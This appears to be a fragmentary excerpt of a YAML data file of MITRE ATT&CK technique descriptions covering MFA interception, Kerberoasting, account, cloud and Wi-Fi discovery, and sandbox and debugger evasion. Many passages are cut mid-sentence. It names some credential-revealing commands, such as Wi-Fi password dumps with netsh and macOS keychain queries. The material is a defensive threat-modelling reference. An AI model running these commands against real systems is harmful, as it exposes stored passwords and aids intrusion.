        MFA is recommended and provides a higher level of security than usernames
        and passwords alone, but organizations should be aware of techniques that
        could be used to intercept and bypass these security mechanisms. \n\nIf a
        smart card is used for multi-factor authentication, then a keylogger will
        need to be used to obtain the password associated with a smart card during
        normal use. With both an inserted card and access to the smart card password,
        an adversary can connect to a network resource using the infected system to
        proxy the authentication with the inserted hardware token. (Citation: Mandiant
        M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target
        other hardware tokens, such as RSA SecurID. Capturing token input (including
        a user's personal identification code) may provide temporary access (i.e.
        replay the one-time passcode until the next value rollover) as well as possibly
        enabling adversaries to reliably predict future authentication values (given
        access to both the algorithm and any seed values used to generate appended
        temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may
        be intercepted and used by an adversary to authenticate. It is common for
        one-time codes to be sent via out-of-band communications (email, SMS). If
        the device and/or service is not secured, then it may be vulnerable to interception.
        Service providers can also be targeted: for example, an adversary may compromise
        an SMS messaging service in order to steal MFA codes sent to users’ phones.(Citation:

        instance of a Windows service. To enable authentication, Kerberos requires
        that SPNs be associated with at least one service logon account (an account
        specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting

        possessing a valid Kerberos ticket-granting ticket (TGT) may request one or
        more Kerberos ticket-granting service (TGS) service tickets for any SPN from
        a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation:
        AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted
        with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the
        service account associated with the SPN is used as the private key and is

      name: Modify Authentication Process
      description: |-
        Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

        Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.

        [Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.

        Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.

        On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)

        Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.

        With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).

        Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)

        Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.

        Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

        Adversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.

      description: "Adversaries may employ various system checks to detect and avoid
        virtualization and analysis environments. This may include changing behaviors
        based on the results of checks for the presence of artifacts indicative of
        a virtual machine environment (VME) or sandbox. If the adversary detects a
        VME, they may alter their malware to disengage from the victim or conceal
        the core functions of the implant. They may also search for VME artifacts
        before dropping secondary or additional payloads. Adversaries may use the
        information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.(Citation: Deloitte
        Environment Awareness)\n\nSpecific checks will vary based on the target and/or
        adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),
        [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information
        Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012)
        to obtain system information and search for VME artifacts. Adversaries may
        search for VME artifacts in memory, processes, file system, hardware, and/or
        the Registry. Adversaries may use scripting to automate these checks  into
        one script and then have the program exit if it determines the system to be
        a virtual environment. \n\nChecks could include generic system properties
        such as host/domain name and samples of network traffic. Adversaries may also
        check the network adapters addresses, CPU core count, and available memory/drive
        size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)
        to check if it was saved in a folder or file with unexpected or even analysis-related
        naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks
        may enumerate services running that are unique to these applications, installed
        programs on the system, manufacturer/product fields for strings relating to
        virtual machine applications, and VME-specific hardware/processor instructions.(Citation:
        McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also
        use a special I/O port to send commands and receive output. \n \nHardware
        checks, such as the presence of the fan, temperature, and audio devices, could
        also be used to gather evidence that can be indicative a virtual environment.
        Adversaries may also query for specific readings from these devices.(Citation:

      name: Network Sniffing
      description: |-
        Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

        Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.

        In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)

        On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)

      description: |
        Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.

        Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)

        On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)

For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)

        An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.

        Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)

        Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.

        Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)

      description: |-
        Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

        Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.

        For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.

      description: |+
        Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

        Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)

        Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.

      description: |-
        Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)).

        Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console)

        Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis.

        In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)

      description: "Adversaries may employ various user activity checks to detect
        and avoid virtualization and analysis environments. This may include changing
        behaviors based on the results of checks for the presence of artifacts indicative
        of a virtual machine environment (VME) or sandbox. If the adversary detects
        a VME, they may alter their malware to disengage from the victim or conceal
        the core functions of the implant. They may also search for VME artifacts
        before dropping secondary or additional payloads. Adversaries may use the
        information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        during automated discovery to shape follow-on behaviors.(Citation: Deloitte
        Environment Awareness)\n\nAdversaries may search for user activity on the
        host based on variables such as the speed/frequency of mouse movements and
        clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks,
        or number of files in common directories such as home or the desktop. Other
        methods may rely on specific user interaction with the system before the malicious
        code is activated, such as waiting for a document to close before activating
        a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double
        click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) "

      name: Password Policy Discovery
      description: |-
        Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

        Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)

        Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).

Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)

        Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)

        Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment.

Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

        Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

        Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.

        An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.

        Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)

        For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)

        Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).

      name: Debugger Evasion
      description: |-
        Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

        Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.

        Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

        Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit)

        Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)

        An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or <code>systemsetup</code> on macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation: systemsetup mac time) These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.(Citation: Mac Time Sync)(Citation: linux system time)

        System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service) In addition, adversaries can discover device uptime through functions such as <code>GetTickCount()</code> to determine how long it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)

        On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can be used for the same purpose.

        In addition, system calls – such as <code>time()</code> – have been used to collect the current time on Linux devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current time zone information or current date and time.(Citation: System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)

        This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)

      name: Acquire Infrastructure
      description: |-
        Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.

        Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.

        to distribute malware to victims. Ads can be purchased to plant as well as
        favorably position artifacts in specific locations  online, such as prominently
        placed within search engine results. These ads may make it more difficult
        for users to distinguish between actual search results and advertisements.(Citation:
        spamhaus-malvertising) Purchased ads may also target specific audiences using
        the advertising network’s capabilities, potentially further taking advantage
        of the trust inherently given to search engines and popular websites. \n\nAdversaries
        may purchase ads and other resources to help distribute artifacts containing
        malicious code to victims. Purchased ads may attempt to impersonate or spoof
        well-known brands. For example, these spoofed ads may trick victims into clicking
        the ad which could then send them to a malicious domain that may be a clone
        of official websites containing trojanized versions of the advertised software.(Citation:
        Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious
        domains and purchase advertisements may also be automated at scale to better
        resist cleanup efforts.(Citation: sentinelone-malvertising) \n\nMalvertising
        may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)
        and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially
        requiring limited interaction from the user if the ad contains code/exploits
        that infect the target system's web browser.(Citation: BBC-malvertising)\n\nAdversaries
        may also employ several techniques to evade detection by the advertising network.
        For example, adversaries may dynamically route ad clicks to send automated
        crawler/policy enforcer traffic to benign sites while validating potential
        targets then sending victims referred from real ad clicks to malicious pages.
        This infection vector may therefore remain hidden from the ad network as well
        as any visitor not reaching the malicious sites with a valid identifier from
        clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks,
        such as intentional typos to avoid brand reputation monitoring, may also be
        used to evade automated detection.(Citation: spamhaus-malvertising) "

The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.

        Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)

Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.

        Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)

        During malware development, adversaries may intentionally include indicators aligned with other known actors in order to mislead attribution by defenders.(Citation: Olympic Destroyer)(Citation: Risky Bulletin Threat actor impersonates FSB APT)(Citation: GamaCopy organization)

        As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.

        Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)

        adversaries may compromise existing social media accounts. Utilizing an existing

        exist for compromising social media accounts, such as gathering credentials
        via [Phishing for Information](https://attack.mitre.org/techniques/T1598),
        purchasing credentials from third-party sites, or by brute forcing credentials
        (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior
        to compromising social media accounts, adversaries may conduct Reconnaissance
        to inform decisions about which accounts to compromise to further their operation.\n\nPersonas
        may exist on a single site or across multiple sites (ex: Facebook, LinkedIn,
        Twitter, etc.). Compromised social media accounts may require additional development,
        this could include filling out or modifying profile information, further developing
        social networks, or incorporating photos.\n\nAdversaries can use a compromised
        social media profile to create new, or hijack existing, connections to targets
        of interest. These connections may be direct or may include trying to connect
        through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised

        Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)

        An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).

      description: |-
